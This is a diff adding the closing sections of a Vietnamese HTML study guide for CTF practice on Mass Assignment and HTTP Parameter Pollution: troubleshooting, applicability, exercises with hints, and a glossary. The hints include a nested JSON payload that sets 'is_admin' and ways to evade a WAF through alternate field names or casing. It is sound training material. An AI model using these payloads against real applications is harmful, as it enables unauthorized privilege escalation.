+  <div class="note warn"><span class="tag">Tránh chặn nhầm</span>Chỉ áp rule này cho endpoint <strong>đăng ký/sửa
+  hồ sơ công khai</strong> (nơi user thường không có lý do gì gửi field admin) — KHÔNG áp cho endpoint admin
+  thật sự cần set các field này một cách hợp lệ (vd chính admin tạo tài khoản admin khác). Test DetectionOnly
+  trước.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Field gửi vào bị bỏ qua hoàn toàn (không lỗi, chỉ không có tác dụng)</td><td>App có whitelist field được phép gán (cách vá đúng)</td><td>Thử tên field khác, hoặc thử Mass Assignment lồng (mục 06.B)</td></tr>
+    <tr><td>Request bị lỗi 400 khi thêm field lạ</td><td>App dùng schema validation nghiêm (vd Pydantic strict mode) từ chối field không khai báo</td><td>Không khai thác được qua Mass Assignment ở endpoint này</td></tr>
+    <tr><td>HPP không thấy khác biệt gì dù gửi trùng tham số</td><td>Chỉ có 1 tầng xử lý tham số (không có WAF/proxy phân tích riêng, hoặc cả 2 tầng xử lý giống hệt nhau)</td><td>HPP cần ít nhất 2 thành phần hiểu khác nhau mới có tác dụng — thử Mass Assignment thuần thay vì HPP</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App dùng ORM mass-assign trực tiếp từ request (<code>Model(**data)</code>, <code>Model.update(request.json)</code>) không lọc field.</td></tr>
+    <tr><td>❌</td><td>App dùng whitelist/schema rõ ràng, chỉ đọc từng field cụ thể (<code>username=data['username']</code> liệt kê tay từng field).</td></tr>
+    <tr><td>❌</td><td>App dùng DTO/schema validation strict (Pydantic, Marshmallow với <code>unknown='raise'</code>) từ chối field lạ.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay trên Burp, từ đăng ký thường tới khi tạo được tài
+  khoản admin.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ đọc kỹ Response của lần đăng ký ĐẦU TIÊN (chưa thêm field lạ) để
+  tìm tên field thật trước khi đoán mò.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> field <code>is_admin</code> ở cấp top-level bị chặn (request báo lỗi).
+  Thử Mass Assignment lồng qua object <code>profile</code>.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>{"username":"x","password":"y","profile":{"is_admin":true}}</code>
+  — nhiều ORM chỉ validate field cấp 1, bỏ qua field bên trong object lồng.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> endpoint có WAF chặn chuỗi <code>"is_admin"</code> trong body. Nghĩ 2 cách
+  khác nhau để vẫn gán được quyền admin mà không gửi đúng nguyên văn chuỗi đó.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>(1) Thử tên field khác có cùng tác dụng (<code>role</code>,
+  <code>permissions</code>); (2) thử Unicode/case khác nếu WAF so khớp chữ thường tuyệt đối
+  (<code>"Is_Admin"</code>, dù ORM có thể không phân biệt hoa thường tùy ngôn ngữ).</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Mass Assignment</td><td>Gán hàng loạt field từ request trực tiếp vào model mà không lọc field cho phép.</td></tr>
+    <tr><td>HTTP Parameter Pollution (HPP)</td><td>Gửi trùng tên tham số nhiều lần, lợi dụng việc các tầng xử lý khác nhau đọc giá trị khác nhau.</td></tr>
+    <tr><td>Whitelist field</td><td>Cách vá đúng: chỉ cho phép gán những field đã liệt kê rõ ràng, từ chối mọi field khác.</td></tr>
+    <tr><td>Nested object</td><td>Object lồng bên trong object khác trong JSON, đôi khi "lọt" qua kiểm tra chỉ áp dụng ở cấp ngoài cùng.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong> <code>arjun</code> (đã cài),
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Mass Assignment/</code>,
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/HTTP Parameter Pollution/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("mass-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("mass-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
